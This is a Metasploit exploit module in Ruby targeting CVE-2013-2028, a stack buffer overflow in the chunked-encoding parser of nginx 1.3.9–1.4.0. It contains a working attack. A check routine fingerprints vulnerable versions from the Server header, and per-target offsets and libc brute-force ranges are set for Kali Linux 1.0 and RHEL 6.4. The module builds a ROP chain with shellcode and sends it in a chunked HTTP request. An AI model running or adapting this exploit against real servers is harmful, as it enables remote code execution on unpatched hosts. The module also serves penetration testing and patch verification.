##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	include Exploit::Remote::HttpClient
	include Msf::Exploit::RopDb
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Nginx HTTP Server 1.3.9-1.4.0 Chuncked Encoding Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx. The exploit first triggers an integer overflow in the ngx_http_parse_chunked() 
                by supplying an overly long hex value as chunked block size. This value is later used when determining the number of bytes to read into a stack buffer, thus the overflow becomes possible. 
			},
			'Author'         => 
                [
                    'Greg MacManus',    # original discovery
                    'hal',              # exploit development
                    'saelo'             # exploit development
                ],
			'DisclosureDate' => 'May 07 2013',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-2028'],
					['OSVDB', '93037'],
					['URL', 'http://nginx.org/en/security_advisories.html'],
					['URL', 'http://packetstormsecurity.com/files/121560/Nginx-1.3.9-1.4.0-Stack-Buffer-Overflow.html']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisabeNops' => false,
					'Space'    => 0x800,
					'BadChars' => "\x0d\x0a\x20",
				},
			'Targets'        =>
				[
					[
						'Kali Linux 1.0',
						{
							'Arch' => ARCH_X86,
							'Ropname' => 'Kali Linux 1.0',
							'Platform' => 'linux',
							'Offset' => 5030,
							'Bruteforce' =>
								{
									'Start' => { 'libc_base' => 0xb74c0000},
									'Stop'  => { 'libc_base' => 0xb75d0000},
									'Step'  => 0x1000
								}
						},
					],
					[
						'Red Hat Enterprise Linux 6.4',
						{
							'Arch' => ARCH_X86,
							'Ropname' => 'Red Hat Enterprise Linux 6.4',
							'Platform' => 'linux',
							'Offset' => 5048,
							'Bruteforce' =>
								{
									'Start' => { 'libc_base' => 0x00110000},
									'Stop'  => { 'libc_base' => 0x0044f000},
									'Step'  => 0x1000
								}
						}
					],
				],

			'DefaultTarget' => 0
        ))

		register_advanced_options(
			[
				OptInt.new("StackCanary", [false, "Use this value as stack canary", "0xffffffff"])
			], self.class)

	end

	def check
		@peer = "#{rhost}:#{rport}"

		begin
			res = send_request_cgi({
				'uri' => '/'
			})

			if res and res.code == 200 and res.headers['Server'] =~ /nginx\/(1\.3\.(9|10|11|12|13|14|15|16)|1\.4\.0)/
				return Exploit::CheckCode::Appears
			elsif res and res.code == 200 and res.headers['Server'] =~ /nginx/
				return Exploit::CheckCode::Detected
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
		end

		return Exploit::CheckCode::Unknown

	end

	def brute_exploit(target_addrs)
		connect

		print_status("Sending #{payload.encoded.length} byte payload at base 0x%08x" % target_addrs['libc_base'])

		data = 	"A" * target['Offset']
		data <<	generate_rop_payload('nginx', payload.encoded,{'target'=>target['Ropname'], 'base'=> target_addrs['libc_base'] })
		data << payload.encoded

		begin
			send_request_raw({
				'uri' => 	'/',
				'headers' =>  {
					'Transfer-Encoding' => "Chunked",
				},
				'data' => data
			}, 2)
		rescue Errno::ECONNRESET => e
			# Ignore
		end


		handler
	end

end

